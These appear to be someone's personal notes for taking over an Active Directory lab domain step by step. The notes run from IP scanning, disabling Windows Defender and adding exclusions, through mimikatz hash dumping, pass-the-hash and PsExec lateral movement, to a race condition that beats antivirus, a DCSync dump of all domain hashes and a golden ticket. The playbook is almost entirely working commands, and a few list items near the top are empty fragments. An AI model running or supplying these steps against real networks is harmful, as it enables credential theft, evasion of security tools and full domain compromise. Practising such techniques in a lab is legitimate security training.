STEPS 4 DOMAD
Run angry IP scanner (or dl it and then run it) to find IP's of other machines
Download sysinternals
Get a user added to admin (priv escalation)
  - 
)
  - 
)
  - 
)
  - 
)
  - 
)
  - 
)
  - 


Exclude C: disk on defender, needs .\name to do local machine instead of ADLAB domain
Download mimikatz
Run as admin 

Privilege::debug
Sekurlsa::logonpasswords 
> Find admin ntlm hash
sekurlsa::pth /user:Administrator /domain:WIN10CLIENT /ntlm:af992895db0f2c42a1bc96546e92804a ((pass the hash))
> With the CMD opened, test if ur running as admin ( run 'dir \\192.168.56.30\c$')
Run 'net group "domain admins" /domain' to find members of domads
> Use psloggedon from the systinternalssuite to see who is currently logged on to the local machine
> run 'psloggedon \\win10adm'
Run 'PsExec -r ExecPs \\ip cmd' to open cmd on the admin machine
Download sysinternals on admin machine
> run 'curl -L -o SysinternalsSuite.zip https://download.sysinternals.com/files/SysinternalsSuite.zip'
> run 'tar -xf SysinternalsSuite.zip'
Disable windefender on downloads folder
> Run ' powershell -Command "Start-Process powershell -Argumentlist 'Add-MpPreference -ExclusionPath "C:\Users\Administrator\Downloads"' '


IF THAT DOESN'T WORK:
> Net use x: \\192.168.56.30\c$ ((from client machine))
> then go to x: (type x: in cmd), which will put us in the x drive on our own machine, which allows us to cd into the folders on there, allowing us to copy mimikatz to the folder we made and excluded. 
> Go to the excluded folder (x:\Users\Administrator\Downloads on the client machine and then run (( copy c:\Users\Normaluser\Downloads\Mimikatz_trunk\x64\*.* . ))
RACE CONDITION:
> We need to open mimikatz before windows defender can catch it in transit, defender cant delete an open file handle. So we need to be quick to open mimikatz.exe once we copy it over. I did this by going to x: , cd'ing to Users\Administrator\Downloads and having mimikatz.exe ready to run.

Get domad hash:
> Repeat commands to get hashes (from the mimikatz window from the admin machine)
go back to my client pc and run the sekurlsa::pth command with user domad on domain win10client ((sekurlsa::pth /user:domad /domain:WIN10CLIENT /ntlm:hash))
which does work and opens me a CMD. I can run dir \\192.168.56.10\c$ to test
> Run mimimatz from this window
Dump hashes:
" lsadump::dcsync /domain:adlab.local /all /csv "  ((from the new window 'as domad'))


Golden ticket:
> Get Kerberos hash, and get sid from local cmd whoami /user (remove the last 4 digits and -)
> In your local mimikatz, Kerberos::golden /domain:adlab.local /sid:sid /rc4:ntlm /user:name /id:500 /ptt
> Misc::cmd
 

